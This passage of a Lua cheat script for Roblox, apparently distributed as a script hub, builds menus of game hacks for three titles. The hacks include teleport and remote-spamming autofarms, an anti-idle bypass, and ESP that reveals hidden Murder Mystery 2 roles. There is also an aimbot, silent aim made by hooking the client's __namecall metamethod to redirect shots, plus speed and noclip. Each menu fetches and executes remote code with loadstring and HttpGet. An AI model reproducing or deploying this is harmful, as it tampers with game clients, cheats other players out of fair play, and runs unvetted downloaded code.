      AF:CreateToggle({ Name="💰 Autofarm Coins", CurrentValue=false, Flag="IEAutofarm", Callback=function(Value) _G.IEAutofarm=Value if Value then task.spawn(function() local c=game.Players.LocalPlayer.Character local hrp=c and c:FindFirstChild("HumanoidRootPart") local originalCF=hrp and hrp.CFrame while _G.IEAutofarm do c=game.Players.LocalPlayer.Character hrp=c and c:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(4242,1000,2442) end task.wait(0.1) end c=game.Players.LocalPlayer.Character hrp=c and c:FindFirstChild("HumanoidRootPart") if hrp and originalCF then hrp.CFrame=originalCF end R:Notify({Title="💰 Autofarm",Content="Stopped! Teleported back.",Duration=3}) end) end end })

      W:CreateTab("⭐ Credits", 4483362458):CreateParagraph({ Title="🛗 Insane Elevator Script", Content="Made with ❤️ by Paulematic\n\nFor Insane Elevator!\n⭐ v1.0" })
      R:LoadConfiguration()
   end,
})

-- =====================
-- UNBOXING RNG
-- =====================
HomeTab:CreateParagraph({ Title="🎟️ Unboxing RNG", Content="For Unboxing RNG!\n• Auto Money Farm\n• Auto Join Giveaway\n• Auto Buy Upgrades\n• World Teleports\n• Anti AFK" })
HomeTab:CreateButton({
   Name = "🎟️ Open Unboxing RNG Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)
      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({ Name="🎟️ Unboxing RNG", LoadingTitle="Unboxing RNG Script", LoadingSubtitle="⚡ by Paulematic", Theme="Aqua", ConfigurationSaving={Enabled=true,FolderName=nil,FileName="UnboxingRNGConfig"}, KeySystem=false })

      local Players = game:GetService("Players") local LocalPlayer = Players.LocalPlayer local RS = game:GetService("ReplicatedStorage") local autoKillActive = false
      local function startAutoKill() autoKillActive=true task.spawn(function() while autoKillActive do local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,-5000,0) end task.wait(0.1) end end) end
      local function stopAutoKill() autoKillActive=false local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,100,0) end end
      setupCommands(Players, LocalPlayer, R, startAutoKill, stopAutoKill)

      local VirtualUser = game:GetService("VirtualUser")
      game:GetService("Players").LocalPlayer.Idled:Connect(function() VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) task.wait(1) VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame) end)

      local Main = W:CreateTab("⚡ Main", 4483362458) Main:CreateSection("💰 Auto Farm")
      Main:CreateToggle({ Name="💰 Auto Money", CurrentValue=false, Flag="AutoMoney", Callback=function(v) _G.AutoMoney=v if v then R:Notify({Title="💰 Auto Money",Content="Farming money!",Duration=3}) task.spawn(function() while _G.AutoMoney do pcall(function() RS:WaitForChild("UI"):WaitForChild("Remotes"):WaitForChild("ClickMoney"):FireServer() end) task.wait(0.1) end end) else R:Notify({Title="💰 Auto Money",Content="Stopped!",Duration=3}) end end })
      Main:CreateToggle({ Name="🎁 Auto Join Giveaway", CurrentValue=false, Flag="AutoGiveaway", Callback=function(v) _G.AutoGiveaway=v if v then R:Notify({Title="🎁 Giveaway",Content="Auto joining giveaways!",Duration=3}) task.spawn(function() while _G.AutoGiveaway do pcall(function() RS:WaitForChild("Giveaways"):WaitForChild("Remotes"):WaitForChild("Join"):FireServer() end) task.wait(5) end end) else R:Notify({Title="🎁 Giveaway",Content="Stopped!",Duration=3}) end end })
      Main:CreateSection("🛡️ Misc")
      Main:CreateParagraph({ Title="🛡️ Anti AFK", Content="✅ Anti AFK is always active!\nYou will never get kicked for being idle." })

      local TpTab = W:CreateTab("📍 Teleports", 4483362458) TpTab:CreateSection("🌍 World Teleports")
      TpTab:CreateButton({ Name="🌍 World 1", Callback=function() local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(-146.488403,3.395023,-12.319352) R:Notify({Title="📍 Teleported!",Content="World 1!",Duration=3}) end end })
      TpTab:CreateButton({ Name="🌍 World 2", Callback=function() local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(-284.059082,2.998024,-11.088804) R:Notify({Title="📍 Teleported!",Content="World 2!",Duration=3}) end end })
      TpTab:CreateButton({ Name="🌍 World 3", Callback=function() local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(-401.469971,3.156824,-10.935662) R:Notify({Title="📍 Teleported!",Content="World 3!",Duration=3}) end end })
      TpTab:CreateButton({ Name="🌍 World 4", Callback=function() local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(-492.037170,3.395022,-13.086606) R:Notify({Title="📍 Teleported!",Content="World 4!",Duration=3}) end end })

      local UpTab = W:CreateTab("⬆️ Upgrades", 4483362458) UpTab:CreateSection("⬆️ Auto Buy Upgrades")
      UpTab:CreateToggle({ Name="💰 Auto Buy Money Per Click", CurrentValue=false, Flag="AutoMoneyPerClick", Callback=function(v) _G.AutoMoneyPerClick=v if v then R:Notify({Title="💰 Upgrade",Content="Auto buying Money Per Click!",Duration=3}) task.spawn(function() while _G.AutoMoneyPerClick do pcall(function() RS:WaitForChild("Upgrades"):WaitForChild("Remotes"):WaitForChild("Upgrade"):InvokeServer("MoneyPerClick") end) task.wait(1) end end) else R:Notify({Title="💰 Upgrade",Content="Stopped!",Duration=3}) end end })
      UpTab:CreateToggle({ Name="🍀 Auto Buy Luck Boost", CurrentValue=false, Flag="AutoLuckBoost", Callback=function(v) _G.AutoLuckBoost=v if v then R:Notify({Title="🍀 Upgrade",Content="Auto buying Luck Boost!",Duration=3}) task.spawn(function() while _G.AutoLuckBoost do pcall(function() RS:WaitForChild("Upgrades"):WaitForChild("Remotes"):WaitForChild("Upgrade"):InvokeServer("LuckBoost") end) task.wait(1) end end) else R:Notify({Title="🍀 Upgrade",Content="Stopped!",Duration=3}) end end })
      UpTab:CreateToggle({ Name="🎒 Auto Buy Inventory Space", CurrentValue=false, Flag="AutoInventory", Callback=function(v) _G.AutoInventory=v if v then R:Notify({Title="🎒 Upgrade",Content="Auto buying Inventory Space!",Duration=3}) task.spawn(function() while _G.AutoInventory do pcall(function() RS:WaitForChild("Upgrades"):WaitForChild("Remotes"):WaitForChild("Upgrade"):InvokeServer("InventorySpace") end) task.wait(1) end end) else R:Notify({Title="🎒 Upgrade",Content="Stopped!",Duration=3}) end end })
      UpTab:CreateToggle({ Name="📦 Auto Buy Case Slots", CurrentValue=false, Flag="AutoCaseSlots", Callback=function(v) _G.AutoCaseSlots=v if v then R:Notify({Title="📦 Upgrade",Content="Auto buying Case Slots!",Duration=3}) task.spawn(function() while _G.AutoCaseSlots do pcall(function() RS:WaitForChild("Upgrades"):WaitForChild("Remotes"):WaitForChild("Upgrade"):InvokeServer("CaseSlots") end) task.wait(1) end end) else R:Notify({Title="📦 Upgrade",Content="Stopped!",Duration=3}) end end })

      W:CreateTab("⭐ Credits", 4483362458):CreateParagraph({ Title="🎟️ Unboxing RNG Script", Content="Made with ❤️ by Paulematic\n\nFor [🎟️NOW!] Unboxing RNG!\n⭐ v1.0" })
      R:LoadConfiguration()
   end,
})

-- =====================
-- MURDER MYSTERY 2
-- =====================
HomeTab:CreateParagraph({ Title="🔪 Murder Mystery 2", Content="For MM2!\n• ESP (Red/Blue/Green roles)\n• Magnetism Aimbot\n• Silent Aim\n• Auto Farm Coins\n• Auto Get Gun" })
HomeTab:CreateButton({
   Name = "🔪 Open Murder Mystery 2 Script",
   Callback = function()
      Rayfield:Destroy()
      task.wait(0.5)
      local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
      local W = R:CreateWindow({ Name="🔪 Paulematic MM2", LoadingTitle="Murder Mystery 2", LoadingSubtitle="⚡ by Paulematic", Theme="Aqua", KeySystem=true, KeySettings={Title="🔪 Paulematic MM2",Subtitle="🔑 Key System",Note="Enter the key to access",FileName="MM2Key",SaveKey=true,GrabKeyFromSite=false,Key={"Sigma"}} })

      local Players = game:GetService("Players") local RunService = game:GetService("RunService") local UserInputService = game:GetService("UserInputService") local LocalPlayer = Players.LocalPlayer local Camera = workspace.CurrentCamera local Mouse = LocalPlayer:GetMouse()
      local autoKillActive = false
      local function startAutoKill() autoKillActive=true task.spawn(function() while autoKillActive do local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,-5000,0) end task.wait(0.1) end end) end
      local function stopAutoKill() autoKillActive=false local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame=CFrame.new(0,100,0) end end
      setupCommands(Players, LocalPlayer, R, startAutoKill, stopAutoKill)

      local espEnabled=false local aimbotEnabled=false local silentAimEnabled=false local magnetismRange=80 local aimbotSmoothing=0.15 local autoFarmEnabled=false local autoGunEnabled=false local espObjects={}

      local function getRole(player)
         local char=player.Character if not char then return "innocent" end
         for _,tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") then local name=tool.Name:lower() if name:find("knife") or name:find("murder") then return "murderer" end if name:find("gun") or name:find("sheriff") or name:find("revolver") then return "sheriff" end end end
         local backpack=player:FindFirstChild("Backpack") if backpack then for _,tool in ipairs(backpack:GetChildren()) do if tool:IsA("Tool") then local name=tool.Name:lower() if name:find("knife") or name:find("murder") then return "murderer" end if name:find("gun") or name:find("sheriff") or name:find("revolver") then return "sheriff" end end end end
         return "innocent"
      end
      local function getRoleColor(role) if role=="murderer" then return Color3.fromRGB(255,0,0) end if role=="sheriff" then return Color3.fromRGB(0,120,255) end return Color3.fromRGB(0,255,0) end
      local function getRoleLabel(role) if role=="murderer" then return "🔪 MURDERER" end if role=="sheriff" then return "🔵 SHERIFF" end return "🟢 INNOCENT" end

      local function createESP(player)
         if espObjects[player] then return end
         local boxOutline=Drawing.new("Square") boxOutline.Visible=false boxOutline.Color=Color3.fromRGB(0,0,0) boxOutline.Thickness=3 boxOutline.Filled=false
         local box=Drawing.new("Square") box.Visible=false box.Thickness=1.5 box.Filled=false
         local name=Drawing.new("Text") name.Visible=false name.Color=Color3.fromRGB(255,255,255) name.Size=14 name.Center=true name.Outline=true
         local role=Drawing.new("Text") role.Visible=false role.Size=13 role.Center=true role.Outline=true
         local health=Drawing.new("Text") health.Visible=false health.Size=12 health.Center=true health.Outline=true
         local tracer=Drawing.new("Line") tracer.Visible=false tracer.Thickness=1 tracer.Transparency=0.7
         local dot=Drawing.new("Circle") dot.Visible=false dot.Radius=4 dot.Filled=true dot.NumSides=32
         espObjects[player]={box=box,boxOutline=boxOutline,name=name,role=role,health=health,tracer=tracer,dot=dot}
      end
      local function removeESP(player) if espObjects[player] then for _,obj in pairs(espObjects[player]) do obj:Remove() end espObjects[player]=nil end end

      local function updateESP()
         for _,player in ipairs(Players:GetPlayers()) do
            if player~=LocalPlayer then
               if espEnabled then
                  if not espObjects[player] then createESP(player) end
                  local esp=espObjects[player] local char=player.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") local head=char and char:FindFirstChild("Head") local humanoid=char and char:FindFirstChildOfClass("Humanoid")
                  if hrp and head then
                     local hrpScreen,hrpVisible=Camera:WorldToViewportPoint(hrp.Position) local headScreen=Camera:WorldToViewportPoint(head.Position+Vector3.new(0,0.5,0))
                     if hrpVisible then
                        local playerRole=getRole(player) local color=getRoleColor(playerRole) local label=getRoleLabel(playerRole)
                        local height=math.abs(headScreen.Y-hrpScreen.Y)*2.2 local width=height*0.55 local x=hrpScreen.X-width/2 local y=headScreen.Y-height*0.1
                        esp.boxOutline.Size=Vector2.new(width,height) esp.boxOutline.Position=Vector2.new(x,y) esp.boxOutline.Visible=true
                        esp.box.Size=Vector2.new(width,height) esp.box.Position=Vector2.new(x,y) esp.box.Color=color esp.box.Visible=true
                        esp.name.Position=Vector2.new(hrpScreen.X,y-30) esp.name.Text=player.Name esp.name.Visible=true
                        esp.role.Position=Vector2.new(hrpScreen.X,y-16) esp.role.Text=label esp.role.Color=color esp.role.Visible=true
                        if humanoid then local hp=math.floor(humanoid.Health) local maxHp=math.floor(humanoid.MaxHealth) local ratio=hp/maxHp esp.health.Position=Vector2.new(hrpScreen.X,y+height+2) esp.health.Text="❤️ "..hp.."/"..maxHp esp.health.Color=Color3.fromRGB(255*(1-ratio),255*ratio,0) esp.health.Visible=true end
                        esp.tracer.From=Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y) esp.tracer.To=Vector2.new(hrpScreen.X,hrpScreen.Y) esp.tracer.Color=color esp.tracer.Visible=true
                        esp.dot.Position=Vector2.new(headScreen.X,headScreen.Y) esp.dot.Color=color esp.dot.Visible=true
                     else for _,obj in pairs(esp) do obj.Visible=false end end
                  else if espObjects[player] then for _,obj in pairs(espObjects[player]) do obj.Visible=false end end end
               else if espObjects[player] then for _,obj in pairs(espObjects[player]) do obj.Visible=false end end end
            end
         end
      end

      local function getClosestToCursor()
         local mousePos=Vector2.new(Mouse.X,Mouse.Y) local closest=nil local closestDist=magnetismRange
         for _,player in ipairs(Players:GetPlayers()) do
            if player~=LocalPlayer and player.Character then
               local head=player.Character:FindFirstChild("Head") if head then local screenPos,onScreen=Camera:WorldToViewportPoint(head.Position) if onScreen then local dist=(Vector2.new(screenPos.X,screenPos.Y)-mousePos).Magnitude if dist<closestDist then closestDist=dist closest=player end end end
            end
         end
         return closest
      end

      local oldNamecall
      oldNamecall=hookmetamethod(game,"__namecall",function(self,...) local args={...} local method=getnamecallmethod() if silentAimEnabled and method=="FireServer" then local target=getClosestToCursor() if target and target.Character then local head=target.Character:FindFirstChild("Head") if head then for i,arg in ipairs(args) do if typeof(arg)=="Instance" and arg:IsA("BasePart") then args[i]=head end if typeof(arg)=="Vector3" then args[i]=head.Position end if typeof(arg)=="CFrame" then args[i]=head.CFrame end end end end end return oldNamecall(self,table.unpack(args)) end)

      local fovCircle=Drawing.new("Circle") fovCircle.Visible=false fovCircle.Radius=magnetismRange fovCircle.Color=Color3.fromRGB(255,255,255) fovCircle.Thickness=1.5 fovCircle.Filled=false fovCircle.NumSides=64

      RunService.RenderStepped:Connect(function()
         fovCircle.Position=Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2) fovCircle.Radius=magnetismRange
         if aimbotEnabled then local target=getClosestToCursor() if target and target.Character then local head=target.Character:FindFirstChild("Head") if head then local targetCF=CFrame.new(Camera.CFrame.Position,head.Position) Camera.CFrame=Camera.CFrame:Lerp(targetCF,aimbotSmoothing) end end end
         updateESP()
      end)

      task.spawn(function() while true do if autoFarmEnabled then local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then for _,obj in ipairs(workspace:GetDescendants()) do if not autoFarmEnabled then break end local name=obj.Name:lower() if name:find("coin") or name:find("gold") then hrp.CFrame=obj.CFrame+Vector3.new(0,1,0) task.wait(0.1) end end end end task.wait(0.3) end end)
      task.spawn(function() while true do if autoGunEnabled then local char=LocalPlayer.Character local hrp=char and char:FindFirstChild("HumanoidRootPart") if hrp then for _,obj in ipairs(workspace:GetDescendants()) do if not autoGunEnabled then break end local name=obj.Name:lower() if (name:find("gun") or name:find("revolver") or name:find("sheriff")) then hrp.CFrame=obj.CFrame+Vector3.new(0,1,0) task.wait(0.2) break end end end end task.wait(0.5) end end)

      Players.PlayerRemoving:Connect(removeESP)
      Players.PlayerAdded:Connect(function(player) player.CharacterAdded:Connect(function() task.wait(0.5) if espEnabled then createESP(player) end end) end)

      local ESPTab=W:CreateTab("👁️ ESP",4483362458)
      ESPTab:CreateSection("👁️ ESP Settings")
      ESPTab:CreateToggle({ Name="👁️ Enable ESP", CurrentValue=false, Flag="MM2ESP", Callback=function(v) espEnabled=v if v then for _,player in ipairs(Players:GetPlayers()) do if player~=LocalPlayer then createESP(player) end end else for _,player in ipairs(Players:GetPlayers()) do if espObjects[player] then for _,obj in pairs(espObjects[player]) do obj.Visible=false end end end end R:Notify({Title="👁️ ESP",Content=v and "ESP enabled!" or "ESP disabled!",Duration=3}) end })
      ESPTab:CreateParagraph({ Title="🎨 ESP Colors", Content="🟢 Green = Innocent\n🔵 Blue = Sheriff (updates when gun picked up)\n🔴 Red = Murderer\n\nColors update live!" })

      local AimbotTab=W:CreateTab("🎯 Aimbot",4483362458)
      AimbotTab:CreateSection("🎯 Magnetism Aimbot")
      AimbotTab:CreateParagraph({ Title="ℹ️ How it works", Content="Aim near a player and the aimbot magnetizes your crosshair to them." })
      AimbotTab:CreateToggle({ Name="🎯 Enable Aimbot", CurrentValue=false, Flag="MM2Aimbot", Callback=function(v) aimbotEnabled=v fovCircle.Visible=v R:Notify({Title="🎯 Aimbot",Content=v and "Aimbot enabled!" or "Aimbot disabled!",Duration=3}) end })
      AimbotTab:CreateSlider({ Name="🔵 Magnetism Range", Range={10,300}, Increment=5, Suffix="px", CurrentValue=80, Flag="MM2MagRange", Callback=function(v) magnetismRange=v fovCircle.Radius=v end })
      AimbotTab:CreateSlider({ Name="💨 Smoothing", Range={1,30}, Increment=1, Suffix="%", CurrentValue=15, Flag="MM2Smooth", Callback=function(v) aimbotSmoothing=v/100 end })
      AimbotTab:CreateColorPicker({ Name="🎨 FOV Color", Color=Color3.fromRGB(255,255,255), Flag="MM2FOVColor", Callback=function(v) fovCircle.Color=v end })
      AimbotTab:CreateSection("🔇 Silent Aim")
      AimbotTab:CreateToggle({ Name="🔇 Enable Silent Aim", CurrentValue=false, Flag="MM2Silent", Callback=function(v) silentAimEnabled=v R:Notify({Title="🔇 Silent Aim",Content=v and "Silent aim enabled!" or "Silent aim disabled!",Duration=3}) end })

      local FarmTab=W:CreateTab("💰 Farm",4483362458)
      FarmTab:CreateSection("💰 Auto Farm")
      FarmTab:CreateToggle({ Name="💰 Auto Farm Coins", CurrentValue=false, Flag="MM2AutoFarm", Callback=function(v) autoFarmEnabled=v R:Notify({Title="💰 Auto Farm",Content=v and "Farming coins!" or "Stopped!",Duration=3}) end })
      FarmTab:CreateToggle({ Name="🔫 Auto Get Gun", CurrentValue=false, Flag="MM2AutoGun", Callback=function(v) autoGunEnabled=v R:Notify({Title="🔫 Auto Gun",Content=v and "Auto getting gun!" or "Stopped!",Duration=3}) end })

      local MiscTab=W:CreateTab("⚙️ Misc",4483362458)
      MiscTab:CreateSection("⚙️ Player")
      MiscTab:CreateSlider({ Name="🚀 Walk Speed", Range={16,200}, Increment=1, Suffix=" Speed", CurrentValue=16, Flag="MM2WS", Callback=function(v) local char=LocalPlayer.Character if char and char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid").WalkSpeed=v end end })
      MiscTab:CreateSlider({ Name="⬆️ Jump Power", Range={50,300}, Increment=1, Suffix=" Power", CurrentValue=50, Flag="MM2JP", Callback=function(v) local char=LocalPlayer.Character if char and char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid").UseJumpPower=true char:FindFirstChildOfClass("Humanoid").JumpPower=v end end })
      MiscTab:CreateToggle({ Name="♾️ Infinite Jump", CurrentValue=false, Flag="MM2IJ", Callback=function(v) _G.MM2IJ=v if v then UserInputService.JumpRequest:Connect(function() if _G.MM2IJ then local char=LocalPlayer.Character if char then char:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping") end end end) end end })
      MiscTab:CreateToggle({ Name="👻 No Clip", CurrentValue=false, Flag="MM2NC", Callback=function(v) _G.MM2NC=v RunService.Stepped:Connect(function() if _G.MM2NC then local char=LocalPlayer.Character if char then for _,p in pairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end end end end) end })

      W:CreateTab("⭐ Credits",4483362458):CreateParagraph({ Title="🔪 Paulematic MM2", Content="Made with ❤️ by Paulematic\n\nFor Murder Mystery 2\n⭐ v1.0\n\n• ESP with live role colors\n• Magnetism Aimbot\n• Silent Aim\n• Auto Farm & Auto Gun" })
      R:LoadConfiguration()
   end,
})
